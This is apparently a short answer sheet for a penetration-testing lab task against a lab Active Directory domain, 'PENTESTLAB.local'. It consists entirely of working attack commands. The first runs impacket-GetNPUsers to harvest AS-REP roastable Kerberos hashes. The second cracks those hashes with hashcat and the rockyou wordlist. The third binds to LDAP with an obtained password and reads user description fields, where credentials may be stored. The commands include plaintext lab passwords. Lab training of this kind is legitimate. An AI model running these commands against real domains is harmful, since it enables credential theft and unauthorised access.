hints and answers


TAsk 0

impacket-GetNPUsers PENTESTLAB.local/student:'Str0ngPass!2026' \
    -dc-ip 192.168.56.20 -request -format hashcat -outputfile asrep.txt

hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt --force

ldapsearch -x -H ldap://192.168.56.20 \
-D "legacy@PENTESTLAB.local" \
-w 'Password123' \
-b "dc=pentestlab,dc=local" \
"(sAMAccountName=legacy)" comment description info adminDescription



